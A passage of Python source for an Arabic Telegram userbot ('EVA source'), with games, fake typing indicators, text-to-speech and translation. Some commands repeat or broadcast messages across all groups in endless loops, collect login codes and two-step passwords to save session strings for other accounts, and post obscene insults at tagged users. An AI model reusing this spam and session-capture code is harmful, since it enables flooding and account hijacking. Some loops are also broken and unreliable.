        await event.edit(f"**اول من يرسل كلمة (انا) سيشارك في لعبة المحيبس\nملاحظة : لفتح العضمة ارسل طك ورقم العضمة لأخذ المحبس أرسل جيب ورقم العضمة**")

@client.on(events.NewMessage(pattern=r"^محيبس$"))
async def handler(event):
    global group_game_status
    chat_id = event.chat_id
    if chat_id in group_game_status:
        group_game_status[chat_id]['is_game_started2'] = False
    await handle_clue(event)
    

@client.on(events.NewMessage(pattern=r'\طك (\d+)'))
async def handle_strike(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id in group_game_status and group_game_status[chat_id]['is_game_started2'] and event.sender_id == group_game_status[chat_id]['joker_player']:
        strike_position = int(event.pattern_match.group(1))
        if strike_position == correct_answer:
            game_board = [["💍" if i == correct_answer - 1 else "🖐️" for i in range(6)]]
            await event.reply(f"** خسرت شبيك مستعجل وجه الچوب 😒\n{format_board(game_board, numbers_board)}**")
            game_board = [row[:] for row in original_game_board]
            group_game_status[chat_id]['is_game_started2'] = False
            group_game_status[chat_id]['joker_player'] = None
        else:
            game_board[0][strike_position - 1] = '🖐️'
            lMl10l = random.choice(joker)
            await event.reply(f"**{lMl10l}**\n{format_board(game_board, numbers_board)}")

@client.on(events.NewMessage(pattern=r'\جيب (\d+)'))
async def handle_guess(event):
    global group_game_status, correct_answer, game_board
    chat_id = event.chat_id
    if chat_id in group_game_status and group_game_status[chat_id]['is_game_started2'] and event.sender_id == group_game_status[chat_id]['joker_player']:
        guess = int(event.pattern_match.group(1))
        if 1 <= guess <= 6:
            if guess == correct_answer:
                winner_id = event.sender_id
                if winner_id not in points:
                    points[winner_id] = 0
                points[winner_id] += 1
                sender = await event.get_sender()
                sender_first_name = sender.first_name if sender else 'مجهول'
                sorted_points = sorted(points.items(), key=lambda x: x[1], reverse=True)
                points_text = '\n'.join([f'{i+1}• {(await l313l.get_entity(participant_id)).first_name}: {participant_points}' for i, (participant_id, participant_points) in enumerate(sorted_points)])
                game_board = [["💍" if i == correct_answer - 1 else "🖐️" for i in range(6)]]
                await l313l.send_message(event.chat_id, f'الف مبروووك 🎉 الاعب ( {sender_first_name} ) وجد المحبس 💍!\n{format_board(game_board, numbers_board)}')
                game_board = [row[:] for row in original_game_board]
                await l313l.send_message(event.chat_id, f'نقاط الاعب : {points[winner_id]}\nنقاط المشاركين:\n{points_text}')
            else:
                game_board = [["💍" if i == correct_answer - 1 else "🖐️" for i in range(6)]]
                await event.reply(f"**ضاع البات ماضن بعد تلگونة ☹️\n{format_board(game_board, numbers_board)}**")
                game_board = [row[:] for row in original_game_board]
            group_game_status[chat_id]['is_game_started2'] = False
            group_game_status[chat_id]['joker_player'] = None

@client.on(events.NewMessage(pattern=r'\انا'))
async def handle_incoming_message(event):
    global group_game_status
    chat_id = event.chat_id
    if chat_id not in group_game_status:
        group_game_status[chat_id] = {
            'is_game_started2': False,
            'joker_player': None
        }
    if group_game_status[chat_id]['is_game_started2'] and not group_game_status[chat_id]['joker_player']:
        group_game_status[chat_id]['joker_player'] = event.sender_id
        await event.reply(f"**تم تسجيلك في المسابقة روح سورس ايفا بظهرك\n{format_board(game_board, numbers_board)}**")

def format_board(game_board, numbers_board):
    formatted_board = ""
    formatted_board += " ".join(numbers_board[0]) + "\n"
    formatted_board += " ".join(game_board[0]) + "\n"
    return formatted_board

@client.on(events.NewMessage(pattern=r'منع_التفليش'))
async def handle_incoming_message(event):
    addgvar("Mn3_Kick", True)
    await event.edit("**⎙︙ تم تفعيل منع التفليش للمجموعة بنجاح ✓**")

@client.on(events.NewMessage(pattern=r'سماح_التفليش'))
async def handle_incoming_message(event):
    delgvar("Mn3_Kick")
    await event.edit("**⎙︙ تم تفعيل منع التفليش للمجموعة بنجاح ✓**")
message_counts = {}
enabled_groups = []
Ya_Abbas = False
@client.on(events.NewMessage(pattern=r'النشر تعطيل'))
async def handle_incoming_message(event):
    global Ya_Abbas
    Ya_Abbas = True
    enabled_groups.append(event.chat_id)
    await event.edit("**⎙︙ ✓ تم تفعيل امر منع النشر التلقائي بنجاح**")
@client.on(events.NewMessage(pattern=r'النشر تفعيل'))
async def handle_incoming_message(event):
    global Ya_Abbas
    Ya_Abbas = False
    enabled_groups.remove(event.chat_id)
    await event.edit("**⎙︙ تم تعطيل امر منع النشر التلقائي بنجاح ✓ **")

@client.on(events.NewMessage(outgoing=True, pattern=".زيج حزين"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/125/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : زيج حزين ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".اويلي$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/361/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : اويلي ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".هاروني$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/N_G_A_A/380/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : هاروني ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".انا$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/Xgoopb/4/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : انا الذي ارعب امريكا ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".برع$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/Xgoopb/5/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="⎙︙ BY : تف يله برع برع ⎙",parse_mode="html")
  await joker313.delete()

@client.on(events.NewMessage(from_users='me', pattern='.فحص'))
async def send_welcome_message(event):
    await event.delete()
    current_time = dt.datetime.now(dt.timezone(dt.timedelta(hours=3)))
    uptime = current_time.strftime('%H:%M')
    python_version = platform.python_version()
    telethon_ver = telethon_version.__version__
    setup_date = dt.datetime.now(dt.timezone(dt.timedelta(hours=3)))
    setup_date_str = setup_date.strftime('%Y-%m-%d %H:%M')
    Tare5 = installation_time  # يجب تعريف المتغير installation_time
    mention = ""  # يجب تعريف المتغير mention
    try:
        ping_time = ping("8.8.8.8", unit="ms")
        if ping_time is not None:
            ping_result = f"{ping_time:.2f} ms"
        else:
            ping_result = "تعذر الحساب"
    except Exception:
        ping_result = "تعذر الحساب"
    if event.sender is not None:
        owner_mention = event.sender.username if event.sender.username else ""
    else:
        owner_mention = ""
    mention = owner_mention
    start_time = time.time()  # يجب تعريف المتغير start_time
    end_time = time.time()
    ms = round((end_time - start_time) * 1000, 2)  # يجب تعريف المتغير ms بشكل صحيح
    welcome_message = f""" 
╭─━━━━━━𖤐━━━━━━─╮ 
✦ 𝙽𝙰𝙼𝙴 : `{mention}` ٫ 
────────────── 
✦ 𝙿𝚈𝚃𝙷𝙾𝙽 : `{python_version}` ٫ 
────────────── 
✦ 𝐄𝐕𝐄 : `{telethon_ver}` ٫ 
────────────── 
✦ 𝚄𝙿𝚃𝙸𝙼𝙴 : `{uptime}` ٫ 
────────────── 
✦ 𝙿𝙸𝙽𝙶 : `{ms}` ٫ 
────────────── 
✦ 𝚂𝙴𝚃𝚄𝙿 𝙳𝙰𝚃𝙴 : `{setup_date_str}` ٫ 
────────────── 
✦ 𝐈𝐃 : `{event.sender_id}` ٫ 
╰──━━━━━━𖤐━━━━━━──╯ 
✦ [ 𝗘𝗩𝗔 𝗦𝗢𝗨𝗥𝗖𝗘 ](t.me/S21S6) 
✦ """
    await event.respond(welcome_message)

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.سوبر (\d+)$"))
async def final_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    message =  await event.get_reply_message()
    try:
        sleeptimet = int(seconds[0])
    except Exception:
        return await event.reply("**▪︎|يجب استخدام كتابة صحيحة الرجاء التاكد من الامر اولا.**", parse_mode="md")
    finalll = event.client
    global final
    final = True
    await final_supernshr(finalll, sleeptimet, message)

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.بلش (\d+)$"))
async def repeat_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = int(event.pattern_match.group(1))
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**▪︎|يجب الرد على رسالة لاستخدام هذا الامر.**", parse_mode="md")

    global final
    final = True

    while final:
        await message.respond(message)
        await asyncio.sleep(seconds)
        

@client.on(events.NewMessage(outgoing=True, pattern=r"^\.تناوب (\d+)$"))
async def rotate_handler(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    await event.delete()
    seconds = int(event.pattern_match.group(1))
    message = await event.get_reply_message()
    if not message:
        return await event.reply("**▪︎|يجب الرد على رسالة لاستخدام هذا الامر.**", parse_mode="md")

    global final
    final = True
    chats = await finalll.get_dialogs()
    groups = [chat for chat in chats if chat.is_group]
    num_groups = len(groups)
    current_group_index = 0

    while final:
        try:
            if message.media:
                await finalll.send_file(groups[current_group_index].id, message.media, caption=message.text)
            else:
                await finalll.send_message(groups[current_group_index].id, message.text)
        except Exception as e:
            print(f"Error in sending message to chat {groups[current_group_index].id}: {e}")

@events.register(events.NewMessage(pattern="\.gym$", outgoing=True))
async def gym(event):
    if event.fwd_from:
        return
    deq = deque(list("🏃‍🏋‍🤸‍🏃‍🏋‍🤸‍🏃‍🏋‍🤸‍"))
    for _ in range(48):
        await asyncio.sleep(0.1)
        await event.edit("".join(deq))
        deq.rotate(1)

pattern = r"^test(?:\s|$)([\s\S]*)"
@client.on(events.NewMessage(pattern=pattern))
async def handler(event):
    tr = translate("انا عراقي", lang_tgt="fa").replace("\ N", "\n")
    await edit_or_reply(event, tr)
    result = await l313l(functions.users.GetFullUserRequest(
        id='earthlink_telecommunications'
    ))
    await event.reply(result.stringify())



pattern = r"^تكلم(?:\s|$)([\s\S]*)"
@client.on(events.NewMessage(pattern=pattern))

async def handler(event):

    if event.fwd_from:
        return
    input_str = event.pattern_match.group(1)
    start = datetime.now()
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        text = previous_message.message
        lan = input_str

    elif "|" in input_str:
        lan, text = input_str.split("|")

    else:

        await edit_or_reply(event, "- هذا نص غير صحيح")
        return
        text = text.strip()
        lan = lan.strip()

    HuReevent = await edit_or_reply(event, "⌔∮ جـار التسجيل انتـظر قليلا")


    if not os.path.isdir("./temp/"):

        os.makedirs("./temp/")

    required_file_name = "./temp/" + "voice.ogg"

    try:

        tts = gTTS(text, lang=lan)
        tts.save(required_file_name)
        command_to_execute = [
            "ffmpeg",
            "-i",
             required_file_name,
             "-map",
             "0:a",
             "-codec:a",
             "libopus",
             "-b:a",
             "100k",
             "-vbr",
             "on",
             required_file_name + ".opus"
        ]
        
        try:

            t_response = subprocess.check_output(

                command_to_execute, stderr=subprocess.STDOUT

            )

        except (subprocess.CalledProcessError, NameError, FileNotFoundError) as exc:

            await HuReevent.edit(str(exc))

        else:

            os.remove(required_file_name)

            required_file_name = required_file_name + ".opus"

        end = datetime.now()

        ms = (end - start).seconds

        await event.client.send_file(

            event.chat_id,

            required_file_name,

            reply_to=event.message.reply_to_msg_id,

            allow_cache=False,

            voice_note=True,

        )

        os.remove(required_file_name)

        await edit_delete(

            HuReevent,

            "تحويل النص {} الى مقطع صوتي في {} ثواني ".format(text[0:20], ms),

        )

    except Exception as e:

        await edit_or_reply(HuReevent, f"خطأ:\n{e}")

@client.on(events.NewMessage(pattern="تيك توك(?: |$)(.*)"))
async def _(event):
    if event.fwd_from:
        return
    r_link = event.pattern_match.group(1)
    if ".com" not in r_link:
        await event.edit("**▾∮ يجب وضع رابط الفيديو مع الامر اولا **")
    else:
        await event.edit("**▾∮ تتم المعالجة انتظر قليلا**")
    chat = "@ttsavebot"
    async with bot.conversation(chat) as conv:
        try:
            msg_start = await conv.send_message("/start")
            r = await conv.get_response()
            msg = await conv.send_message(r_link)
            details = await conv.get_response()
            video = await conv.get_response()
            """ قناة ايفا  @S21S6 """
            await bot.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await event.edit("▾∮ الغـي حـظر هـذا البـوت و حـاول مجـددا @ttsavebot")
            return
        await bot.send_file(event.chat_id, video)
        await event.client.delete_messages(
            conv.chat_id, [msg_start.id, r.id, msg.id, details.id, video.id]
        )
        await event.delete()
phone_number_pending = None
phone_code_hash_pending = None
new_client = None 
@client.on(events.NewMessage(outgoing=True, pattern=r"\.جلسة (.+)$"))
async def add_session(event):
    global phone_number_pending, phone_code_hash_pending, new_client
    phone_number = event.pattern_match.group(1)
    phone_number_pending = phone_number
    
    new_client = TelegramClient(StringSession(), api_id, api_hash)
    await new_client.connect()

    if not await new_client.is_user_authorized():
        sent_code = await new_client.send_code_request(phone_number)
        phone_code_hash_pending = sent_code.phone_code_hash
        await event.respond('**▪︎|تم إرسال الكود. الرجاء إرسال الكود باستخدام الأمر `.رمز <الكود>` (مع مسافة بين الأرقام)**', parse_mode="markdown")

@client.on(events.NewMessage(outgoing=True, pattern=r"\.رمز (.+)$"))
async def add_code(event):
    global phone_number_pending, phone_code_hash_pending, new_client 
    if phone_number_pending is None:
        await event.respond('**▪︎|الرجاء إرسال رقم الهاتف أولاً باستخدام الأمر `.جلسة <رقم الهاتف>`**', parse_mode="markdown")
        return

    code = event.pattern_match.group(1).replace(" ", "") 
    try:
        await new_client.sign_in(phone_number_pending, code, phone_code_hash=phone_code_hash_pending)
        save_session(new_client, phone_number_pending)
        await event.respond(f'**▪︎|تمت إضافة الجلسة لرقم الهاتف {phone_number_pending} بنجاح✅️', parse_mode="markdown")
        phone_number_pending = None
        phone_code_hash_pending = None
        new_client = None 
    except SessionPasswordNeededError:
        await event.respond('**▪︎|يتطلب هذا الحساب تحقق بخطوتين. الرجاء إرسال كلمة المرور باستخدام الأمر `.تحقق <كلمة المرور>`**', parse_mode="markdown")
    except Exception as e:
        await event.respond(f'حدث خطأ أثناء إضافة الجلسة: {str(e)}')

@client.on(events.NewMessage(outgoing=True, pattern=r"\.تحقق (.+)$"))
async def add_password(event):
    global phone_number_pending, new_client
    if phone_number_pending is None:
        await event.respond('**▪︎|الرجاء إرسال رقم الهاتف أولاً باستخدام الأمر `.جلسة <رقم الهاتف>`**', parse_mode="markdown")
        return

    password = event.pattern_match.group(1)
    try:
        await new_client.sign_in(phone_number_pending, password=password)  
        save_session(new_client, phone_number_pending)
        await event.respond(f'**▪︎|تمت إضافة الجلسة لرقم الهاتف {phone_number_pending} بنجاح✅️**', parse_mode="markdown")
        phone_number_pending = None
        new_client = None
    except Exception as e:
        await event.respond(f'**▪︎|حدث خطأ أثناء إضافة الجلسة: {e}**', parse_mode="markdown")

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.طباعة (.+)'))
async def ple(event):
    orig_text = event.pattern_match.group(1)
    text = orig_text
    pb = ""
    typing_symbol = "▒"
    while(pb != orig_text):
        try:
            await event.edit(pb + typing_symbol)
            time.sleep(0.05)
            pb += text[0]
            text = text[1:]
            await event.edit(pb)
            time.sleep(0.05)
        except Exception as e:
            print(e)

@client.on(events.NewMessage(outgoing=True, pattern=r"\.شرطة$"))
async def police(event):
    if event.fwd_from:
        return
    animation_ttl = range(0, 12)
    await event.edit("Police")
    animation_chars = [
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        "🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴\n🔵🔵🔵⬜⬜⬜🔴🔴🔴",
        "🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵\n🔴🔴🔴⬜⬜⬜🔵🔵🔵",
        " **Police iz Here**",
    ]
    for i in animation_ttl:
        await asyncio.sleep(0.5)
        await event.edit(animation_chars[i % 12])

@client.on(events.NewMessage(outgoing=True, pattern=r'\.تشفير$'))
async def runb64(event):
    await event.edit("wait...")
    options = event.message.raw_text.split()
    selectsecretmessage = await event.get_reply_message()
    try:
        if options[1] == "en":
            secretmessage = selectsecretmessage.message
            secretmessagebytes = secretmessage.encode("ascii")
            encodesecretmessage = base64.b64encode(secretmessagebytes)
            encodesecretmessagebytes = encodesecretmessage.decode("ascii")
            await event.edit("التشفير...")
            sleep(2)
            await event.edit(f"{encodesecretmessagebytes}")
        elif options[1] == "de":
            secretkey = selectsecretmessage.message
            secretkeybytes = secretkey.encode("ascii")
            decodesecretkey = base64.b64decode(secretkeybytes)
            decodesecretkeybytes = decodesecretkey.decode("ascii")
            await event.edit("فك التشفير...")
            sleep(2)
            await event.edit(f"الرسالة المفككة: {decodesecretkeybytes}")
        else:
            await event.edit("خطأ!!!")
    except IndexError:
        await event.edit("لكتابة ترميز او فك الترميز اكتب .تشفير بالرد على الرسالة")
    except:
        await event.edit("بعض الاخطاء!!!") 

@client.on(events.NewMessage(pattern="^/purge"))
async def purge(event):
    chat = event.chat_id
    msgs = []

    if not await is_administrator(user_id=event.sender_id, message=event):
        await event.reply("انـت لسـت ادمـن!")
        return

    msg = await event.get_reply_message()
    if not msg:
        await event.reply("قـم بالـرد على الـرسالة التـي تريـد حذف الـرسائل التـي تحـتها.")
        return

    try:
        msg_id = msg.id
        count = 0
        to_delete = event.message.id - 1
        await tgbot.delete_messages(chat, event.message.id)
        msgs.append(event.reply_to_msg_id)
        for m_id in range(to_delete, msg_id - 1, -1):
            msgs.append(m_id)
            count += 1
            if len(msgs) == 100:
                await tgbot.delete_messages(chat, msgs)
                msgs = []

        await tgbot.delete_messages(chat, msgs)
        del_res = await event.client(
            event.chat_id, f"تنظيف سريع {count} رسالة ."
        )

        await asyncio.sleep(4)
        await del_res.delete()

    except MessageDeleteForbiddenError:
        text = "خـطأ في حـذف الـرسائل.\n"
        text += "الـرساله قد تكون قديمة او ليسـت لديـك صلاحـيات الـحذف"
        del_res = await event.reply(text, parse_mode="md")
        await asyncio.sleep(5)
        await del_res.delete()


@client.on(events.NewMessage(pattern="^/del$"))
async def delete_msg(event):

    if not await is_administrator(user_id=event.sender_id, message=event):
        await event.reply("انـت لـست ادمـن!")
        return

    chat = event.chat_id
    msg = await event.get_reply_message()
    if not msg:
        await event.reply("قـم بالـرد على الـرسالة التـي تريـد حذف الـرسائل التـي تحـتها")
        return
    to_delete = event.message
    chat = await event.get_input_chat()
    rm = [msg, to_delete]
    await tgbot.delete_messages(chat, rm)
    
@client.on(events.NewMessage(pattern=".رفع مرتي(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"🚻 ** ⎙︙ المستخدم => • ** [{JoKeRUB}](tg://user?id={user.id}) \n ☑️ **⎙︙ تم رفعها مرتك بواسطه :**{my_mention} 👰🏼‍♀️.\n**⎙︙ يلا حبيبي امشي نخلف بيبي 👶🏻🤤** ")

@client.on(events.NewMessage(pattern=".رفع جلب(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    if user.id == 8115539074:
        return await event.edit("**- لكك دي هذا المطور**")
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**⎙︙ المستخدم** [{JoKeRUB}](tg://user?id={user.id}) \n**⎙︙ تـم رفعـه جلب 🐶 بواسطة :** {my_mention} \n**⎙︙ خليه خله ينبح 😂**ستخدم** [{JoKeRUB}](tg://user?id={user.id}) \n**⎙︙ تـم رفعـه جلب 🐶 بواسطة :** {my_mention} \n**⎙︙ خليه خله ينبح 😂**")

@client.on(events.NewMessage(pattern="زواج(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    JoKeRUB = user.last_name.replace("\u2060", "") if user.last_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f""
    await event.edit(f"⎙︙ لقد تم زواجك/ج من :  💍\n⎙︙ الف الف مبروك الان يمكنك اخذ راحتك ")

@client.on(events.NewMessage(pattern=".رفع ابن قحبة(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    if user.id == 8115539074:
        return await event.edit("**- لكك دي هذا المطور**")
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    await event.edit(f"**⎙︙ المستخدم** [{JoKeRUB}](tg://user?id={user.id}) \n**⎙︙ تــم رفــعــة ابــن قــحــبــة 🖕 بواسطة :** {my_mention} \n**⎙︙ خليه يرضع من زبك 😂**ستخدم** [{JoKeRUB}](tg://user?id={user.id}) \n**⎙︙ تــم رفــعــة ابــن قــحــبــة 🖕 بواسطة :** {my_mention} \n**⎙︙ خليه يرضع من زبك 😂**")
    

@client.on(events.NewMessage(pattern="كتابة(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- يجب كتابة الامر بشكل صحيح**")
    await event.edit(f"**تم بدء وضع الكتابة الوهمية لـ {t} من الثوانـي**")
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(t)

@client.on(events.NewMessage(pattern="الرابط$"))
async def _(e):
    rr = await edit_or_reply(e, "**يتم جلب الرابط انتظر **")
    try:
        r = await e.client(
            ExportChatInviteRequest(e.chat_id),
        )
    except no_admin:
        return await eod(rr, "عذرا انت لست مشرف في هذه الدردشة", time=10)
    await eod(rr, f"- رابط الدردشة\n {r.link}")
        
HuRe_Bosa = ["روح لعند المطور وقول له", "ايع مقرف", "همممممم"]

@client.on(events.NewMessage(pattern=".بوسة$"))
async def ithker(knopis):
    await knopis.edit(random.choice(HuRe_Bosa))

DevJoker = [8115539074]

HuRe_5erok = [
    "** ‎لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ **",
    "** لو خيروك |  أسئلة محرجة أسئلة صراحة ماذا ستختار؟ **",
    "** هل كذبت على والديك من قبل..؟ **",
    "** لو خيروك |  بين إمكانية تواجدك في الفضاء وبين إمكانية تواجدك في البحر؟ **",
    "** لو خيروك |  بين أستاذ اللغة  ية أو أستاذ الرياضيات؟ **",
    "** تحس انك محظوظ بالاشخاص الي حولك ؟ **",
    "** لو خيروك |  بين مشاهدة كرة القدم أو متابعة الأخبار؟ **",
    "** لو خيروك |  بين تناول الشوكولا التي تفضلها لكن مع إضافة رشة من الملح والقليل من عصير الليمون إليها أو تناول ليمونة كاملة كبيرة الحجم؟ **",
    "** لو خيروك |  أن تعيش قصة فيلم هل تختار الأكشن أو الكوميديا؟ **",
    "** لو كنت شخص آخر هل تفضل البقاء معك أم أنك ستبتعد عن نفسك؟ **",
    "** لو خيروك |  بين الاستماع إلى الأخبار الجيدة أولًا أو الاستماع إلى الأخبار السيئة أولًا؟ **",
    "** لو خيروك |  بين ارتداء ملابس البيت لمدة أسبوع كامل أو ارتداء البدلة الرسمية لنفس المدة؟ **",
    "** لو خيروك |  بين أن تتكلم بالهمس فقط طوال الوقت أو أن تصرخ فقط طوال الوقت؟ **",
    "** لو خيروك |  بإنقاذ شخص واحد مع نفسك بين أمك أو ابنك؟ **",
    "** لو خيروك |  بين البقاء بدون هاتف لمدة شهر أو بدون إنترنت لمدة أسبوع؟ **",
    "** لو خيروك |  بين رجل أعمال أو أمير؟ **",
    "** لو خيروك |  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام كريم الأساس لغسيل الأطباق؟ **",
    "** لو خيروك |  بين مشاهدة الدراما في أيام السبعينيات أو مشاهدة الأعمال الدرامية للوقت الحالي؟ **",
    "** لو خيروك |  بين امتلاك القدرة على تغيير لون شعرك متى تريدين وبين الحصول على مكياج من قبل خبير تجميل وذلك بشكل يومي؟ **",
    "** لو خيروك |  بين الإبحار لمدة أسبوع كامل أو السفر على متن طائرة لـ 3 أيام متواصلة؟! **",
    "** لو خيروك |  بين أن تصبحي عارضة أزياء وبين ميك آب أرتيست؟ **",
    "** لو خيروك |  بين تناول الشوكولا التي تحبين طوال حياتك ولكن لا يمكنك الاستماع إلى الموسيقى وبين الاستماع إلى الموسيقى ولكن لا يمكن لك تناول الشوكولا أبدًا؟ **",
    "** لو خيروك |  بين زوجتك وابنك/ابنتك؟ **",
    "** لو خيروك |  بين إما الحصول على المال أو على المزيد من الوقت؟ **",
    "** لو خيروك |  بين شراء منزل صغير أو استئجار فيلا كبيرة بمبلغ معقول؟ **",
    "** لو خيروك |  بين أمك وأبيك؟ **",
    "** لو خيروك |  بين إنهاء الحروب في العالم أو إنهاء الجوع في العالم؟ **",
    "** لو خيروك |  بين نشر تفاصيل حياتك المالية وبين نشر تفاصيل حياتك العاطفية؟ **",
    "** لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ **",

]


@client.on(events.NewMessage(pattern=".خيروك$"))
async def ithker(knopis):
    await knopis.edit(random.choice(HuRe_5erok))

@client.on(events.NewMessage(outgoing=True, pattern="هاك"))
async def repo(event):
    if event.fwd_from:
        return
    lMl10l = Config.TG_BOT_USERNAME
    if event.reply_to_msg_id:
        await event.get_reply_message()
    await bot.send_message(lMl10l, "/hack")
    response = await bot.inline_query(lMl10l, "هاك")
    await response[0].click(event.chat_id)
    await event.delete()
    
file_path = "installation_date.txt"
if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
    with open(file_path, "r") as file:
        installation_time = file.read().strip()
else:
    installation_time = datetime.now().strftime("%Y-%m-%d")
    with open(file_path, "w") as file:
        file.write(installation_time)

@client.on(events.NewMessage(pattern="صوتية(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- يجب كتابة الامر بشكل صحيح**")
    await event.edit(f"**تم بدء وضع ارسال الصوتية الوهمية لـ {t} من الثوانـي**")
    async with event.client.action(event.chat_id, "record-audio"):
        await asyncio.sleep(t)


@client.on(events.NewMessage(pattern="فيد(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- يجب كتابة الامر بشكل صحيح**")
    await event.edit(f"**تم بدء وضع ارسال الفيديو الوهمي لـ {t} من الثوانـي**")
    async with event.client.action(event.chat_id, "record-video"):
        await asyncio.sleep(t)


@client.on(events.NewMessage(pattern="لعبة(?: |$)(.*)"))
async def _(event):
    t = event.pattern_match.group(1)
    if not (t or t.isdigit()):
        t = 100
    else:
        try:
            t = int(t)
        except BaseException:
            try:
                t = await event.ban_time(t)
            except BaseException:
                return await event.edit("**- يجب كتابة الامر بشكل صحيح**")
    await event.edit(f"**تم بدء وضع اللعب الوهمي لـ {t} من الثوانـي**")
    async with event.client.action(event.chat_id, "game"):
        await asyncio.sleep(t)

from googletrans import Translator

translator = Translator()

tr_status = {}

@client.on(events.NewMessage(outgoing=True, pattern=".مترجم (.*)"))
async def start_translate(event):
    if event.fwd_from:
        return
    lang = event.pattern_match.group(1).strip()
    chat_id = event.chat_id
    tr_status[chat_id] = lang
    await event.edit(f"**تم تفعيل المترجم إلى اللغة: {lang}**", parse_mode="md")

@client.on(events.NewMessage)
async def auto_translate(event):
    if event.fwd_from:
        return
    chat_id = event.chat_id
    if chat_id in tr_status:
        lang = tr_status[chat_id]
        try:
            translated = await translator.translate(event.message.message, dest=lang)
